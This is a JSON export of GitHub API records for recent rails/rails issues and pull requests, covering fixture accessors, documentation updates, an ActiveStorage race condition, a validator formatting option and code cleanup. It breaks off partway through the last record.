[
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51213",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51213/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51213/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51213/events",
        "html_url": "https://github.com/rails/rails/pull/51213",
        "id": 2158589699,
        "node_id": "PR_kwDNIULOaCbYPg",
        "number": 51213,
        "title": "Expose a generic fixture accessor for fixture names that may conflict with Minitest",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-28T10:12:45Z",
        "updated_at": "2024-02-28T10:12:50Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51213",
            "html_url": "https://github.com/rails/rails/pull/51213",
            "diff_url": "https://github.com/rails/rails/pull/51213.diff",
            "patch_url": "https://github.com/rails/rails/pull/51213.patch",
            "merged_at": null
        },
        "body": "```ruby\r\nassert_equal \"Ruby on Rails\", web_sites(:rubyonrails).name\r\nassert_equal \"Ruby on Rails\", fixture(:web_sites, :rubyonrails).name\r\n```\r\n\r\nThis was brought to me by someone with a `Metadata` model. The fixtures accessor being `metadata` which conflicts with the `metadata` method recently added in `Minitest`.\r\n\r\ncc @zk-1",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51213/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51213/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51212",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51212/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51212/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51212/events",
        "html_url": "https://github.com/rails/rails/pull/51212",
        "id": 2157724556,
        "node_id": "PR_kwDNIULOaBtFWQ",
        "number": 51212,
        "title": "Update active_job_basics.md",
        "user": {
            "login": "cjilbert504",
            "id": 54157657,
            "node_id": "MDQ6VXNlcjU0MTU3NjU3",
            "avatar_url": "https://avatars.githubusercontent.com/u/54157657?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/cjilbert504",
            "html_url": "https://github.com/cjilbert504",
            "followers_url": "https://api.github.com/users/cjilbert504/followers",
            "following_url": "https://api.github.com/users/cjilbert504/following{/other_user}",
            "gists_url": "https://api.github.com/users/cjilbert504/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/cjilbert504/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/cjilbert504/subscriptions",
            "organizations_url": "https://api.github.com/users/cjilbert504/orgs",
            "repos_url": "https://api.github.com/users/cjilbert504/repos",
            "events_url": "https://api.github.com/users/cjilbert504/events{/privacy}",
            "received_events_url": "https://api.github.com/users/cjilbert504/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-27T22:31:02Z",
        "updated_at": "2024-02-27T22:31:07Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51212",
            "html_url": "https://github.com/rails/rails/pull/51212",
            "diff_url": "https://github.com/rails/rails/pull/51212.diff",
            "patch_url": "https://github.com/rails/rails/pull/51212.patch",
            "merged_at": null
        },
        "body": "\r\n<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because Solid Queue is not in the list of Job backends in the ActiveJob guide. \r\n\r\n### Detail\r\n\r\nThis Pull Request adds Solid Queue to the list of backends for ActiveJob and links to the README for Solid Queue.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [X] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [X] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51212/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51212/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51211",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51211/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51211/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51211/events",
        "html_url": "https://github.com/rails/rails/pull/51211",
        "id": 2156780127,
        "node_id": "PR_kwDNIULOaA4keQ",
        "number": 51211,
        "title": "[ci skip] docs: add around_update callback example",
        "user": {
            "login": "MiguelArgentina",
            "id": 50305489,
            "node_id": "MDQ6VXNlcjUwMzA1NDg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/50305489?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/MiguelArgentina",
            "html_url": "https://github.com/MiguelArgentina",
            "followers_url": "https://api.github.com/users/MiguelArgentina/followers",
            "following_url": "https://api.github.com/users/MiguelArgentina/following{/other_user}",
            "gists_url": "https://api.github.com/users/MiguelArgentina/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/MiguelArgentina/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/MiguelArgentina/subscriptions",
            "organizations_url": "https://api.github.com/users/MiguelArgentina/orgs",
            "repos_url": "https://api.github.com/users/MiguelArgentina/repos",
            "events_url": "https://api.github.com/users/MiguelArgentina/events{/privacy}",
            "received_events_url": "https://api.github.com/users/MiguelArgentina/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-27T14:45:38Z",
        "updated_at": "2024-02-27T23:09:17Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51211",
            "html_url": "https://github.com/rails/rails/pull/51211",
            "diff_url": "https://github.com/rails/rails/pull/51211.diff",
            "patch_url": "https://github.com/rails/rails/pull/51211.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because there's no example for `around_ ` callbacks, so I think it's useful for newcomers like me\r\n\r\n### Detail\r\n\r\nThis Pull Request changes 2 files, adding an example for an `around_update` callback:\r\n- `activerecord/lib/active_record/callbacks.rb`\r\n- `guides/source/active_record_callbacks.md`\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51211/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51211/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51210",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51210/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51210/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51210/events",
        "html_url": "https://github.com/rails/rails/pull/51210",
        "id": 2156681458,
        "node_id": "PR_kwDNIULOaAzLxA",
        "number": 51210,
        "title": "[RF DOCS] Active Model Basics Documentation [ci-skip]",
        "user": {
            "login": "Ridhwana",
            "id": 2786819,
            "node_id": "MDQ6VXNlcjI3ODY4MTk=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2786819?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Ridhwana",
            "html_url": "https://github.com/Ridhwana",
            "followers_url": "https://api.github.com/users/Ridhwana/followers",
            "following_url": "https://api.github.com/users/Ridhwana/following{/other_user}",
            "gists_url": "https://api.github.com/users/Ridhwana/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Ridhwana/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Ridhwana/subscriptions",
            "organizations_url": "https://api.github.com/users/Ridhwana/orgs",
            "repos_url": "https://api.github.com/users/Ridhwana/repos",
            "events_url": "https://api.github.com/users/Ridhwana/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Ridhwana/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            },
            {
                "id": 6434393529,
                "node_id": "LA_kwDNIULPAAAAAX-FDbk",
                "url": "https://api.github.com/repos/rails/rails/labels/rails%20foundation",
                "name": "rails foundation",
                "color": "e99695",
                "default": false,
                "description": "Rails Foundation PRs"
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-27T14:05:15Z",
        "updated_at": "2024-02-27T22:04:11Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51210",
            "html_url": "https://github.com/rails/rails/pull/51210",
            "diff_url": "https://github.com/rails/rails/pull/51210.diff",
            "patch_url": "https://github.com/rails/rails/pull/51210.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created to update the Active Model Basics Documentation. \r\n\r\n### Detail\r\n\r\nThis Pull Request adds the following two sections: \r\n- AttributeAssignment\r\n- Attributes\r\n\r\nIt updates the rest of the sections by trying to provide more information, be more clear, and include more examples. In some parts, it references the API where more information about the methods can be provided. \r\n\r\nI also addressed these as part of the changes:\r\n\r\n> There's the new ActiveModel::API module that was essentially a split from ActiveModel::Model, this difference can be better explained in the guides as it is in [the original PR](https://github.com/rails/rails/pull/42042).\r\n\r\n> The Lint Tests section example shows ActiveModel::Model, it should probably be ActiveModel::API.\r\n\r\n> It's possible to expand validations with how to check for errors, and other common usage. As well as different types of callback examples.\r\n\r\n> Some examples use send, those can be updated to use public_send instead.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [ ] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51210/reactions",
            "total_count": 9,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 9,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51210/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51209",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51209/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51209/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51209/events",
        "html_url": "https://github.com/rails/rails/issues/51209",
        "id": 2156644426,
        "node_id": "I_kwDNIULOgIvISg",
        "number": 51209,
        "title": "ActiveStorage race condition on attach",
        "user": {
            "login": "alexeevit",
            "id": 7105077,
            "node_id": "MDQ6VXNlcjcxMDUwNzc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/7105077?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/alexeevit",
            "html_url": "https://github.com/alexeevit",
            "followers_url": "https://api.github.com/users/alexeevit/followers",
            "following_url": "https://api.github.com/users/alexeevit/following{/other_user}",
            "gists_url": "https://api.github.com/users/alexeevit/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/alexeevit/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/alexeevit/subscriptions",
            "organizations_url": "https://api.github.com/users/alexeevit/orgs",
            "repos_url": "https://api.github.com/users/alexeevit/repos",
            "events_url": "https://api.github.com/users/alexeevit/events{/privacy}",
            "received_events_url": "https://api.github.com/users/alexeevit/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-27T13:49:52Z",
        "updated_at": "2024-02-27T13:56:48Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "I've ran into a race condition on attaching a file to a `has_many_attached` association. It tries to create 2 `ActiveStorage::Attachment` records, even though I attach only 1 file, so the other file is actually an `ActiveStorage::Blob` that was already created by another request.\r\n\r\nI've done a little research and found, that when the model gets saved the `attachment_changes['images'].send(:subchanges)` has 2 records:\r\n\r\n- `Changes::CreateOneOfMany` for the existing `ActiveStorage::Blob`\r\n- `Changes::CreateOneOfMany` for the new `ActionDispatch::Http::UploadedFile`\r\n\r\nI think, the problem is that when the subchanges get built, it loads `record.attachments` right before the blob is created in another request, and after the blob is created in another request, it loads all blobs for the subchanges. So in the end, it perceives the blob as a completely new attachment.\r\n\r\nMy specific case is super simple. I don't need to know anything about already existing attachments, so the only thing I need is to correctly save and upload the file. So I came up with the next workaround:\r\n\r\n```\r\nsubchange = ActiveStorage::Attached::Changes::CreateOneOfMany.new('images', @storage, params[:image])\r\nstorage.images_attachments << subchange.attachment\r\nsubchange.upload\r\n```\r\n\r\n### Steps to reproduce\r\n\r\n```ruby\r\nclass Storage < ApplicationRecord\r\n  has_many_attached :images\r\nend\r\n\r\nclass Storage::ImagesController < ApplicationController\r\n  def create\r\n    @storage.attach(params[:image])\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\nWhen we're doing multiple requests simultaneously, all the images should get saved successfully, in other words only 1 pair of `ActiveStorage::Attachment` and `ActiveStorage::Blob` is created.\r\n\r\n### Actual behavior\r\n```\r\nActiveRecord::RecordNotUnique (PG::UniqueViolation: ERROR:  duplicate key value violates unique constraint \"index_active_storage_attachments_uniqueness\"\r\nDETAIL:  Key (record_type, record_id, name, blob_id)=(Storage, e51d4675-fe21-42cc-8633-3619ee4e9390, images, f306419f-bc1f-4aaf-b859-ba48e2055514) already exists.\r\n)\r\n```\r\n\r\n### System configuration\r\n**Rails version**: 7.1.1\r\n\r\n**Ruby version**: 3.2.2\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51209/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51209/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51208",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51208/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51208/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51208/events",
        "html_url": "https://github.com/rails/rails/pull/51208",
        "id": 2156331040,
        "node_id": "PR_kwDNIULOaAf0eQ",
        "number": 51208,
        "title": "Add `value_format` option to `numericality`, `length`, and `comparison` validators",
        "user": {
            "login": "techkato",
            "id": 94690524,
            "node_id": "U_kgDOBaTc3A",
            "avatar_url": "https://avatars.githubusercontent.com/u/94690524?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/techkato",
            "html_url": "https://github.com/techkato",
            "followers_url": "https://api.github.com/users/techkato/followers",
            "following_url": "https://api.github.com/users/techkato/following{/other_user}",
            "gists_url": "https://api.github.com/users/techkato/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/techkato/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/techkato/subscriptions",
            "organizations_url": "https://api.github.com/users/techkato/orgs",
            "repos_url": "https://api.github.com/users/techkato/repos",
            "events_url": "https://api.github.com/users/techkato/events{/privacy}",
            "received_events_url": "https://api.github.com/users/techkato/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107190,
                "node_id": "MDU6TGFiZWwxMDcxOTA=",
                "url": "https://api.github.com/repos/rails/rails/labels/activemodel",
                "name": "activemodel",
                "color": "00E5FF",
                "default": false,
                "description": null
            },
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-27T11:18:59Z",
        "updated_at": "2024-02-27T11:19:04Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51208",
            "html_url": "https://github.com/rails/rails/pull/51208",
            "diff_url": "https://github.com/rails/rails/pull/51208.diff",
            "patch_url": "https://github.com/rails/rails/pull/51208.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nIn current implementations, formatting numerical or date values in messages generated by validations typically requires specifying the message option or implementing custom validators.\r\nHowever, I only want to format the `%{count}` and do not need to handle the message, apart from the message option, so I believe it should be a native feature of the framework.\r\n\r\n### Detail\r\n\r\nThis pull request introduces the value_format option for validations such as `numericality`, `length`, and `comparison`. With this option, it becomes possible to format the value passed to `%{count}` in i18n messages.\r\n\r\ne.g. messages like _\"must be equal to 1,000\"_ can now be generated.\r\n```ruby\r\nclass MyModel < ApplicationRecord\r\n  validates :my_attribute, numericality: {\r\n    equal_to: 1_000,\r\n    value_format: -> (value) { value.to_fs(:delimited) }\r\n  }\r\nend\r\n```\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\nThere have been several similar PRs submitted in the past:\r\n\r\n- https://github.com/rails/rails/pull/44076\r\n- https://github.com/rails/rails/pull/41482\r\n\r\nComparing them,\r\n\r\n- There is no impact on existing implementation since it can be specified with options.\r\n- It also supports `length` and `comparison` where `%{count}` is used, not limited to `numericality`.\r\n\r\n<br />\r\n\r\nIf there are any errors or inconsistencies in the English language in the change log or documentation, please point them out.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51208/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51208/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51207",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51207/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51207/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51207/events",
        "html_url": "https://github.com/rails/rails/pull/51207",
        "id": 2156249347,
        "node_id": "PR_kwDNIULOaAbT1Q",
        "number": 51207,
        "title": "Remove `tools/profile`",
        "user": {
            "login": "Earlopain",
            "id": 14981592,
            "node_id": "MDQ6VXNlcjE0OTgxNTky",
            "avatar_url": "https://avatars.githubusercontent.com/u/14981592?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Earlopain",
            "html_url": "https://github.com/Earlopain",
            "followers_url": "https://api.github.com/users/Earlopain/followers",
            "following_url": "https://api.github.com/users/Earlopain/following{/other_user}",
            "gists_url": "https://api.github.com/users/Earlopain/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Earlopain/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Earlopain/subscriptions",
            "organizations_url": "https://api.github.com/users/Earlopain/orgs",
            "repos_url": "https://api.github.com/users/Earlopain/repos",
            "events_url": "https://api.github.com/users/Earlopain/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Earlopain/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-27T10:37:45Z",
        "updated_at": "2024-02-27T21:05:39Z",
        "closed_at": "2024-02-27T20:59:43Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51207",
            "html_url": "https://github.com/rails/rails/pull/51207",
            "diff_url": "https://github.com/rails/rails/pull/51207.diff",
            "patch_url": "https://github.com/rails/rails/pull/51207.patch",
            "merged_at": "2024-02-27T20:59:43Z"
        },
        "body": "### Motivation / Background\r\nRunning this on modern ruby versions fails on `\"\" =~ []`. I believe this has been a change made in Ruby 3.0\r\n\r\nThis also fixes deprecation warnings being printed. The alternatives have been added more than a decade ago, I doubt versions from then would even run on Ruby 3.1 anymore (https://github.com/ruby-prof/ruby-prof/commit/4cdb1d74563b3dce4f5dad460f22d012b855949f)\r\n\r\nNow, if nobody has noticed this breakage, perhaps this is just dead code and should be removed instead? I was just curious what this one was about.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51207/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51207/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51206",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51206/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51206/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51206/events",
        "html_url": "https://github.com/rails/rails/pull/51206",
        "id": 2156234467,
        "node_id": "PR_kwDNIULOaAafqQ",
        "number": 51206,
        "title": "Fix `indexes` method for non-existing MySQL tables",
        "user": {
            "login": "fatkodima",
            "id": 5657035,
            "node_id": "MDQ6VXNlcjU2NTcwMzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5657035?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fatkodima",
            "html_url": "https://github.com/fatkodima",
